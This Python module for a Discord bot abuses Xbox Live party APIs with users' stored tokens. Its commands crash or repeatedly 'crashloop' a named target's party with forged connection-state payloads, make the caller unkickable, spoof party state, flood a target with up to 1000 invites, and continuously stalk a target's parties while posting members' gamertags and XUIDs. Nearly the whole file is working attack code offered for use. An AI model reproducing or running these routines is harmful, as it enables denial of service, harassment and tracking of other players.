from xbox.webapi.api.client import XboxLiveClient
from xbox.webapi.authentication.manager import AuthenticationManager
from xbox.webapi.authentication.models import OAuth2TokenResponse
from xbox.webapi.common.signed_session import SignedSession
from xbox.webapi.authentication.xal import XALManager, XalAppParameters, XalClientParameters
from xbox.webapi.api.provider.profile.models import ProfileUser, ProfileResponse
from xbox.webapi.authentication.xal import XALManager, XalAppParameters, XalClientParameters
from xbox.webapi.api.client import Session
from discord.ui import Button, View
from .authentication import *
from .tools import generate_ms_cv, generate_signature, get_code
import aiohttp, asyncio, random, string
from datetime import datetime
from discord import Interaction
import discord, requests
from config import Config
from discord import app_commands

"""I am aware HEAVY refactoring is needed for these modules. I just kind of wrote everything not really considering coding efficiency."""





async def fakestate(interaction:discord.Interaction, state:app_commands.Choice[int], client=None):
    sisu_tokens = await check_xbox_token_exists(interaction, client, True)
    auth_token = 'XBL3.0 x=' + sisu_tokens.user_token.display_claims.xui[0]['uhs'] + ';' + sisu_tokens.authorization_token.token
    xuid = sisu_tokens.authorization_token.xuid
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": xuid,
        "followed": followed,
        }
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    print(session_data)
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("You are not in a party.")
        return

    print("Session ID:", session_id)
    print(base_url+'/'+session_id)
    response = requests.get(base_url+'/'+session_id+'?nocommit=true&followed=true', headers=headers_get)
    print(response)
    data = response.json()
    members = data["members"]

    lowest_index_member = min(
        members.values(),
        key=lambda member: member.get("constants", {}).get("system", {}).get("index", float("inf"))
    )

    lowest_connection_id = lowest_index_member.get("properties", {}).get("system", {}).get("connection")
    for member_id, member_info in members.items():
        xuid = member_info.get("constants", {}).get("system", {}).get("xuid")
        if xuid == xuid:
            entity_id = member_info.get("properties", {}).get("custom", {}).get("bumblelion", {}).get("entityId")
            subscription_id = member_info.get("properties", {}).get("system", {}).get("subscription", {}).get("id")
            connection = lowest_connection_id or str(uuid.uuid4())
            break
    put_url = f"{base_url}/{session_id}"
    if state.value < 4:
        payload = {
            "members": {
                "me": {
                    "properties": {
                        "custom": {
                            "bumblelion": {
                                "audioEnabled": True,
                                "bumblelionConnectionState": state.value,
                                "entityId": "81ED4671C26C0B2D"
                            },
                            "simpleConnectionState": state.value
                        }
                    }
                }
            }
        }
    elif state.value == 4:
        payload = {
            "members": {
                "me": {
                    "properties": {
                        "custom": {
                            "bumblelion": {
                                "audioEnabled": False,
                                "bumblelionConnectionState": 2,
                                "entityId": "81ED4671C26C0B2D"
                            },
                            "simpleConnectionState": 2
                        }
                    }
                }
            }
        }
    headers_put = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "Signature": generate_signature(auth_token, request_body=json.dumps(payload)),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",
        "Accept-Encoding": "gzip, deflate",
        "Host": "party.xboxlive.com",
        "Connection": "Keep-Alive",
        "Content-Length": str(len(json.dumps(payload))),
        "Cache-Control": "no-cache",
    }
    
    put_response = requests.put(put_url, headers=headers_put, json=payload)
    if put_response.status_code == 200:
        await interaction.followup.send(f"Successfully changed your game state to {state.name}")
    else:
        print(put_response.raw)
        print(put_response.content)
        print(put_response.reason)
        print("Failed to fake the session:", put_response.status_code, put_response.text)
        await interaction.followup.send("Operation failed, try again!")

async def antikick(interaction:discord.Interaction, client=None):
    await interaction.response.defer()
    sisu_tokens = await check_xbox_token_exists(interaction, client, True)
    auth_token = 'XBL3.0 x=' + sisu_tokens.user_token.display_claims.xui[0]['uhs'] + ';' + sisu_tokens.authorization_token.token
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": sisu_tokens.authorization_token.xuid,
        "followed": followed,
        }
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    print(session_data)
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("You are not in a party.")
        return

    print("Session ID:", session_id)
    print(base_url+'/'+session_id)
    response = requests.get(base_url+'/'+session_id+'?nocommit=true&followed=true', headers=headers_get)
    print(response)
    data = response.json()
    members = data["members"]

    lowest_index_member = min(
        members.values(),
        key=lambda member: member.get("constants", {}).get("system", {}).get("index", float("inf"))
    )

    lowest_connection_id = lowest_index_member.get("properties", {}).get("system", {}).get("connection")
    for member_id, member_info in members.items():
        xuid = member_info.get("constants", {}).get("system", {}).get("xuid")
        if xuid == sisu_tokens.authorization_token.xuid:
            entity_id = member_info.get("properties", {}).get("custom", {}).get("bumblelion", {}).get("entityId")
            subscription_id = member_info.get("properties", {}).get("system", {}).get("subscription", {}).get("id")
            connection = lowest_connection_id or str(uuid.uuid4())

            user_details = {
                "entity_id": entity_id,
                "connection": connection,
                "subscription_id": subscription_id
            }
            break
    put_url = f"{base_url}/{session_id}"
    payload = {"members":{"me":{"properties":{"system":{"active":True,"connection":lowest_connection_id,"subscription":{"changeTypes":["everything"],"id":user_details['subscription_id']}}}}}}
    headers_put = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": 'XBL3.0 x=' + sisu_tokens.user_token.display_claims.xui[0]['uhs'] + ';' + sisu_tokens.authorization_token.token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "Signature": generate_signature(auth_token, request_body=json.dumps(payload)),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",
        "Accept-Encoding": "gzip, deflate",
        "Host": "party.xboxlive.com",
        "Connection": "Keep-Alive",
        "Content-Length": str(len(json.dumps(payload))),
        "Cache-Control": "no-cache",
    }
    
    put_response = requests.put(put_url, headers=headers_put, json=payload)
    if put_response.status_code == 200:
        await interaction.followup.send("Successfully made you unkickable! Note, you will not be able to see new members when they join. As you will be desynced from the party. (Work in progress)")
    else:
        print(put_response.raw)
        print(put_response.content)
        print(put_response.reason)
        print("Failed to crash the session:", put_response.status_code, put_response.text)
        await interaction.followup.send("Operation failed, try again!")


async def joinable(interaction:discord.Interaction, client=None, joinable:bool=False):
    sisu_tokens = await check_xbox_token_exists(interaction, client, True)
    auth_token = 'XBL3.0 x=' + sisu_tokens.user_token.display_claims.xui[0]['uhs'] + ';' + sisu_tokens.authorization_token.token
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": sisu_tokens.authorization_token.xuid,
        "followed": followed,
        }
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    print(session_data)
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("You are not in a party.")
        return

    print("Session ID:", session_id)
    print(base_url+'/'+session_id)
    response = requests.get(base_url+'/'+session_id+'?nocommit=true&followed=true', headers=headers_get)
    print(response)
    put_url = f"{base_url}/{session_id}"
    payload = {"properties":{"system":{"closed":False,"joinRestriction":f"{'local' if joinable == False else 'followed'}"}}}
    headers_put = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": 'XBL3.0 x=' + sisu_tokens.user_token.display_claims.xui[0]['uhs'] + ';' + sisu_tokens.authorization_token.token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "Signature": generate_signature(auth_token, request_body=json.dumps(payload)),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",
        "Accept-Encoding": "gzip, deflate",
        "Host": "party.xboxlive.com",
        "Connection": "Keep-Alive",
        "Content-Length": str(len(json.dumps(payload))),
        "Cache-Control": "no-cache",
    }
    
    put_response = requests.put(put_url, headers=headers_put, json=payload)
    if put_response.status_code == 200:
        await interaction.followup.send(f"Successfully changed the status to {'closed' if joinable == False else 'open'}")
    else:
        print(put_response.raw)
        print(put_response.content)
        print(put_response.reason)
        print(f"Failed to {'close' if joinable == False else 'open'} the session:", put_response.status_code, put_response.text)
        await interaction.followup.send("Operation failed, try again!")




async def crashloop(interaction:discord.Interaction, target:str, duration, client):
    session = SignedSession()
    if interaction.guild == None:
        print(interaction.user.name+' tried to execute command privately on ' + target)
        await interaction.response.send_message("Please use this command in a discord server")
        return
    await interaction.response.defer()
    auth_mgr = await check_xbox_token_exists(interaction, client, False)
    if auth_mgr == None:
        await interaction.followup.send("Your account is either banned, or authentication failed! Contact an administrator if this is a consistent error.")
        return
    auth_mgr = AuthenticationManager(session, Config.client_id, Config.client_secret, "")
    with open(('./accounts'+f'/{interaction.user.id}.json')) as f:
        tokens = f.read()
        auth_mgr.oauth = OAuth2TokenResponse.model_validate_json(tokens)
    xbl_client = XboxLiveClient(auth_mgr)
    try:
        target = await xbl_client.profile.get_profile_by_gamertag(target)
    except HTTPStatusError:
        await interaction.followup.send("Could not find a user by that gamertag!")
        return
    target = target.model_dump()['profile_users']
    auth_token = 'XBL3.0 x=' + auth_mgr.user_token.display_claims.xui[0]['uhs'] + ';' + auth_mgr.xsts_token.token
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": target[0]['id'],
        "followed": followed,}
    entity_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

    payload = {
        "members": {
            "me": {
                "properties": {
                    "custom": {
                        "bumblelion": {
                            "audioEnabled": 1,
                            "bumblelionConnectionState": 4,
                            "entityId": entity_id
                        },
                        "simpleConnectionState": 4
                    }
                }
            }
        }
    }
    headers_put = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": "SPWcndQlLtBWsTrw.11",
        "Signature": generate_signature(auth_token, payload),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",
        "Accept-Encoding": "gzip, deflate",
        "Host": "party.xboxlive.com",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
    }

    unsuccessful_crashes = 0
    successful_crashes = 0
    previous_session = None
    class CancelView(View):
        def __init__(self, interaction, message):
            super().__init__()
            self.cancelled = False
            self.interaction = interaction
            self.message = message

        @discord.ui.button(label="Cancel", style=discord.ButtonStyle.red)
        async def cancel_button(self, interaction: discord.Interaction, button: discord.Button):
            if interaction.user.id != self.interaction.user.id:
                await interaction.response.send_message("You do not have permission to cancel this action.", ephemeral=True)
                return
            self.cancelled = True
            button.disabled = True
            if self.message:
                
                await self.message.edit(view=None)

    embed = discord.Embed(title="Crashloop Started",
                          description=f"Crashlooping **{target[0]['settings'][0]['value']}** for {duration} seconds.",
                          color=discord.Color.blue())

    message = await interaction.followup.send(embed=embed)
    view = CancelView(interaction=interaction, message=message)
    await message.edit(view=view)
    async with aiohttp.ClientSession() as session:
        start_time = asyncio.get_event_loop().time()
        end_time = start_time + duration

        print(f"Start time: {start_time}, End time: {end_time}")

        while asyncio.get_event_loop().time() < end_time:
            try:
                if view.cancelled == True:
                    embed = discord.Embed(
    title=":boom: Crashloop Finished!",
    description=f"Crashloop Finished for {interaction.user.mention}!\n\n**Crashes:** {successful_crashes}",
    color=discord.Color.red() 
)
                    await message.edit(embed=embed)
                    return False
                current_time = asyncio.get_event_loop().time()
            except Exception as e:
                print(e)
            print(f"Current time: {current_time}, Time remaining: {end_time - current_time}")

            try:
                async with session.get(base_url, headers=headers_get, params=params) as response:
                    print(response)
                    session_data = await response.json()
                    print(session_data)
            except Exception as e:
                print(f"Error during GET request: {e}")
                await asyncio.sleep(5)
                continue

            try:
                session_id = session_data["results"][0]["sessionRef"]["name"].upper()
                if session_id == previous_session:
                    print("Skipping same session...")
                    await asyncio.sleep(5)
                    continue
                previous_session = session_id
                print("Changed previous session")
            except KeyError as e:
                print(f"Error parsing session ID: {e}")
                await asyncio.sleep(5)
                continue
            except Exception as e:
                print("Ran into error")
                print(e)
                await asyncio.sleep(5)
                continue
            print(f"Crashing {session_id}")
            put_url = f"{base_url}/{session_id}"
            print("Making PUT request...")

            try:
                async with session.put(put_url, headers=headers_put, json=payload) as response:
                    if response.status == 200:
                        successful_crashes += 1
                    else:
                        unsuccessful_crashes += 1
                    print(f"Response received: {len(await response.text())} characters")
            except Exception as e:
                print(f"Error during PUT request: {e}")
                unsuccessful_crashes += 1

            await asyncio.sleep(5)

    print("Finished looping.")
    embed = discord.Embed(
    title=":boom: Crashloop Finished!", 
    description=f"Crashloop Finished for {interaction.user.mention}!\n\n**Crashes:** {successful_crashes}",
    color=discord.Color.red()) 
    await message.edit(embed=embed)

async def inviteallfriends(interaction:discord.Interaction, client):
    if interaction.guild == None:
        print(interaction.user.name+' tried to execute command privately')
        await interaction.response.send_message("Please use this command in a discord server")
        return
    await interaction.response.defer()
    auth_mgr = await check_xbox_token_exists(interaction, client, False)
    if auth_mgr == None:
        await interaction.followup.send("Your account is either banned, or authentication failed! Contact an administrator if this is a consistent error.")
        return
    session = SignedSession()
    auth_mgr = AuthenticationManager(session, Config.client_id, Config.client_secret, "")
    with open(('./accounts'+f'/{interaction.user.id}.json')) as f:
            tokens = f.read()
            auth_mgr.oauth = OAuth2TokenResponse.model_validate_json(tokens)
    await auth_mgr.refresh_tokens()
    xbl_client = XboxLiveClient(auth_mgr)
    auth_token = 'XBL3.0 x=' + auth_mgr.user_token.display_claims.xui[0]['uhs'] + ';' + auth_mgr.xsts_token.token # make a device token id
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": xbl_client.xuid,
        "followed": followed,
        }
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    print(session_data)
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("You are not in a party.")
        return
    
    friends = await xbl_client.people.get_friends_own()

    friends = dict(json.loads(friends.model_dump_json()))

    print("Session ID:", session_id)
    rate_limits = 0
    successful_invites = 0
    url = 'https://party.xboxlive.com/handles'
    async def addresses(session, url, json_request, headers_get):
        try:
            async with session.post(url, json=json_request, headers=headers_get, timeout=5) as response:
                return response.status
        except asyncio.TimeoutError:
            return None

    async def execute_requests(url, headers_get, friends, session_id):
        successful_invites = 0
        rate_limits = 0

        async with aiohttp.ClientSession() as session:
            tasks = [
                addresses(
                    session,
                    url,
                    {
                        "invitedXuid": str(person['xuid']),
                        "sessionRef": {
                            "name": session_id,
                            "scid": "7492BACA-C1B4-440D-A391-B7EF364A8D40",
                            "templateName": "chat"
                        },
                        "type": "invite"
                    },
                    headers_get
                ) for person in friends['people']
            ]
            responses = await asyncio.gather(*tasks)

        for status in responses:
            if status == 201:
                successful_invites += 1
            elif status == 429:
                rate_limits += 1

        return successful_invites, rate_limits

    successful_invites, rate_limits = await execute_requests(url, headers_get, friends, session_id)

    await interaction.followup.send(f"Completed:\n\nSuccessful invites: {successful_invites}\n\nUnsuccessful invites: {rate_limits}")

async def viewparty(interaction:discord.Interaction, target:str, client):
    session = SignedSession()
    if interaction.guild == None:
        print(interaction.user.name+' tried to execute command privately on ' + target)
        await interaction.response.send_message("Please use this command in a discord server")
        return
    await interaction.response.defer()
    auth_mgr = await check_xbox_token_exists(interaction, client, False)
    if auth_mgr == None:
        await interaction.followup.send("Your account is either banned, or authentication failed! Contact an administrator if this is a consistent error.")
        return
    auth_mgr = AuthenticationManager(session, Config.client_id, Config.client_secret, "")
    with open(('./accounts'+f'/{interaction.user.id}.json')) as f:
        tokens = f.read()
        auth_mgr.oauth = OAuth2TokenResponse.model_validate_json(tokens)
    xbl_client = XboxLiveClient(auth_mgr)
    try:
        target = await xbl_client.profile.get_profile_by_gamertag(target)
    except HTTPStatusError:
        await interaction.followup.send("Could not find a user by that gamertag!")
        return
    target = target.model_dump()['profile_users']
    auth_token = 'XBL3.0 x=' + auth_mgr.user_token.display_claims.xui[0]['uhs'] + ';' + auth_mgr.xsts_token.token
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": target[0]['id'],
        "followed": followed,}
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("Target is not in a party.")
        return
    headers_put = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": "SPWcndQlLtBWsTrw.11",
        "Signature": generate_signature(auth_token, {}),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",
        "Accept-Encoding": "gzip, deflate",
        "Host": "party.xboxlive.com",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
    }
    params = {
        "xuid": target[0]['id'],
        "followed": followed,}
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    put_url = f"{base_url}/{session_id}"
    put_response = requests.put(put_url, headers=headers_put, json={})

    parsed_data = json.loads(put_response.content)
    join_restriction = parsed_data['properties']['system']['joinRestriction']

    if join_restriction == 'local':
        party_restriction = "Locked"
    else:
        party_restriction = "Open"

    members = parsed_data['members']

    party_leader = None
    user_details = []

    for user_id, user_data in members.items():
        gamertag = user_data['gamertag']
        xuid = user_data['constants']['system']['xuid']

        user_details.append({'gamertag': gamertag, 'xuid': xuid, 'index': user_data['constants']['system']['index']})

        if party_leader is None or user_data['constants']['system']['index'] < party_leader['index']:
            party_leader = {'gamertag': gamertag, 'xuid': xuid, 'index': user_data['constants']['system']['index']}

    embed = discord.Embed(
        title=f"Party Details | {party_restriction}",
        description="Grabbed party details",
        color=(discord.Color.green() if party_restriction == "Open" else discord.Color.red()),  # You can customize the color
    )
    
    for user in user_details:
        embed.add_field(
            name=f"Gamertag: {user['gamertag']}",
            value=f"XUID: {user['xuid']}",
            inline=False
        )
    
    embed.set_footer(text=f"Party Leader: {party_leader['gamertag']} (XUID: {party_leader['xuid']})")

    await interaction.followup.send(embed=embed)


async def stalkuser(interaction:discord.Interaction, target:str, client):
    previous_session = ''
    session = SignedSession()
    if interaction.guild == None:
        print(interaction.user.name+' tried to execute command privately on ' + target)
        await interaction.response.send_message("Please use this command in a discord server")
        return
    await interaction.response.defer()
    auth_mgr = await check_xbox_token_exists(interaction, client, False)
    if auth_mgr == None:
        await interaction.followup.send("Your account is either banned, or authentication failed! Contact an administrator if this is a consistent error.")
        return
    auth_mgr = AuthenticationManager(session, Config.client_id, Config.client_secret, "")
    with open(('./accounts'+f'/{interaction.user.id}.json')) as f:
        tokens = f.read()
        auth_mgr.oauth = OAuth2TokenResponse.model_validate_json(tokens)
    xbl_client = XboxLiveClient(auth_mgr)
    try:
        target = await xbl_client.profile.get_profile_by_gamertag(target)
    except HTTPStatusError:
        await interaction.followup.send("Could not find a user by that gamertag!")
        return
    await interaction.followup.send("Successfully tracking target")
    target = target.model_dump()['profile_users']
    auth_token = 'XBL3.0 x=' + auth_mgr.user_token.display_claims.xui[0]['uhs'] + ';' + auth_mgr.xsts_token.token
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": target[0]['id'],
        "followed": followed,}
    while True:
        print("checking session")
        response = requests.get(base_url, headers=headers_get, params=params)
        response.raise_for_status()
        session_data = response.json()
        try:
            session_id = session_data["results"][0]["sessionRef"]["name"].upper()
            if session_id == previous_session:
                    print("Skipping same session...")
                    await asyncio.sleep(30)
                    continue
            previous_session = session_id
        except Exception as e:
            await asyncio.sleep(15)
            continue
        headers_put = {
            "Accept": "*/*",
            "Accept-Language": "en-US",
            "Authorization": auth_token,
            "Content-Type": "application/json; charset=utf-8",
            "MS-CV": "SPWcndQlLtBWsTrw.11",
            "Signature": generate_signature(auth_token, {}),
            "User-Agent": "XBL-xComms-Win/4.1.1",
            "x-xbl-contract-version": "107",
            "UA-CPU": "AMD64",
            "Accept-Encoding": "gzip, deflate",
            "Host": "party.xboxlive.com",
            "Connection": "Keep-Alive",
            "Cache-Control": "no-cache",
        }
        params = {
            "xuid": target[0]['id'],
            "followed": followed,}
        base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
        put_url = f"{base_url}/{session_id}"
        put_response = requests.put(put_url, headers=headers_put, json={})

        parsed_data = json.loads(put_response.content)
        join_restriction = parsed_data['properties']['system']['joinRestriction']

        if join_restriction == 'local':
            party_restriction = "Locked"
        else:
            party_restriction = "Open"

        members = parsed_data['members']

        party_leader = None
        user_details = []

        for user_id, user_data in members.items():
            gamertag = user_data['gamertag']
            xuid = user_data['constants']['system']['xuid']

            user_details.append({'gamertag': gamertag, 'xuid': xuid, 'index': user_data['constants']['system']['index']})

            if party_leader is None or user_data['constants']['system']['index'] < party_leader['index']:
                party_leader = {'gamertag': gamertag, 'xuid': xuid, 'index': user_data['constants']['system']['index']}

        embed = discord.Embed(
            title=f"Party Details | {party_restriction}",
            description="Grabbed party details",
            color=(discord.Color.green() if party_restriction == "Open" else discord.Color.red()),
        )


        for user in user_details:
            embed.add_field(
                name=f"Gamertag: {user['gamertag']}",
                value=f"XUID: {user['xuid']}",
                inline=False
            )


        embed.set_footer(text=f"Party Leader: {party_leader['gamertag']} (XUID: {party_leader['xuid']})")

        await interaction.channel.send(embed=embed)

async def crash(interaction:discord.Interaction, target:str, client):
    session = SignedSession()
    if interaction.guild == None:
        print(interaction.user.name+' tried to execute command privately on ' + target)
        await interaction.response.send_message("Please use this command in a discord server")
        return
    await interaction.response.defer()
    auth_mgr = await check_xbox_token_exists(interaction, client, False)
    if auth_mgr == None:
        await interaction.followup.send("Your account is either banned, or authentication failed! Contact an administrator if this is a consistent error.")
        return
    auth_mgr = AuthenticationManager(session, Config.client_id, Config.client_secret, "")
    with open(('./accounts'+f'/{interaction.user.id}.json')) as f:
        tokens = f.read()
        auth_mgr.oauth = OAuth2TokenResponse.model_validate_json(tokens)
    xbl_client = XboxLiveClient(auth_mgr)
    try:
        target = await xbl_client.profile.get_profile_by_gamertag(target)
    except HTTPStatusError:
        await interaction.followup.send("Could not find a user by that gamertag!")
        return
    target = target.model_dump()['profile_users']
    auth_token = 'XBL3.0 x=' + auth_mgr.user_token.display_claims.xui[0]['uhs'] + ';' + auth_mgr.xsts_token.token
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": target[0]['id'],
        "followed": followed,}
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("Target is not in a party.")
        return
    put_url = f"{base_url}/{session_id}"
    payload = {
        "members": {
            "me": {
                "properties": {
                    "custom": {
                        "bumblelion": {
                            "audioEnabled": True,
                            "bumblelionConnectionState": 4,
                            "entityId": ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
                        },
                        "simpleConnectionState": 4
                    }
                }
            }
        }
    }
    headers_put = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": "SPWcndQlLtBWsTrw.11",
        "Signature": generate_signature(auth_token, payload),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",
        "Accept-Encoding": "gzip, deflate",
        "Host": "party.xboxlive.com",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
    }
    put_response = requests.put(put_url, headers=headers_put, json=payload)
    if put_response.status_code == 200:
        await interaction.followup.send("Successfully crashed their party!")
    else:
        print("Failed to crash the session:", put_response.status_code, put_response.text)
        await interaction.followup.send("Failed to crash: target party is invite-only.", ephemeral=True)


async def spaminvite(interaction:discord.Interaction, target:str, amount:int=50, client=None):
    auth_mgr = await check_xbox_token_exists(interaction, client, False)
    if auth_mgr == None:
        await interaction.followup.send("Your account is either banned, or authentication failed! Contact an administrator if this is a consistent error.", ephemeral=True)
        return False
    session = SignedSession()
    auth_mgr = AuthenticationManager(session, Config.client_id, Config.client_secret, "")
    with open(('./accounts'+f'/{interaction.user.id}.json')) as f:
            tokens = f.read()
            auth_mgr.oauth = OAuth2TokenResponse.model_validate_json(tokens)
    if amount > 1000:
        amount = 1000
    elif amount <= 0:
        await interaction.followup.send("You cannot send 0 invites...")
        return
    xbl_client = XboxLiveClient(auth_mgr)
    await auth_mgr.refresh_tokens()
    print("Did authentication")
    auth_token = 'XBL3.0 x=' + auth_mgr.user_token.display_claims.xui[0]['uhs'] + ';' + auth_mgr.xsts_token.token
    try:
        target = await xbl_client.profile.get_profile_by_gamertag(target)
    except HTTPStatusError:
        await interaction.followup.send("Could not find a user by that gamertag!")
        return
    base_url = "https://party.xboxlive.com/serviceconfigs/7492BACA-C1B4-440D-A391-B7EF364A8D40/sessiontemplates/chat/sessions"
    followed = "true"
    headers_get = {
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Authorization": auth_token,
        "Content-Type": "application/json; charset=utf-8",
        "MS-CV": generate_ms_cv(),
        "User-Agent": "XBL-xComms-Win/4.1.1",
        "x-xbl-contract-version": "107",
        "UA-CPU": "AMD64",}
    params = {
        "xuid": xbl_client.xuid,
        "followed": followed,
        }
    response = requests.get(base_url, headers=headers_get, params=params)
    response.raise_for_status()
    session_data = response.json()
    try:
        session_id = session_data["results"][0]["sessionRef"]["name"].upper()
    except Exception as e:
        await interaction.followup.send("You are not in a party.")
        return
    target = target.model_dump()['profile_users']
    print("Session ID:", session_id)
    json_request = {"invitedXuid":target[0]['id'],"sessionRef":{"name":session_id,"scid":"7492BACA-C1B4-440D-A391-B7EF364A8D40","templateName":"chat"},"type":"invite"}
    rate_limits = 0
    successful_invites = 0
    url = 'https://party.xboxlive.com/handles'
    async def addresses(session, url, json_request, headers_get):
        try:
            async with session.post(url, json=json_request, headers=headers_get, timeout=5) as response:
                return response.status
        except asyncio.TimeoutError:
            return None
    async def execute_requests(url, amount, json_request, headers_get):
            successful_invites = 0
            rate_limits = 0

            async with aiohttp.ClientSession() as session:
                tasks = [addresses(session, url, json_request, headers_get) for _ in range(amount)]
                responses = await asyncio.gather(*tasks)

            for status in responses:
                if status == 201:
                    successful_invites += 1
                else: 
                    rate_limits += 1

            return successful_invites, rate_limits
    #
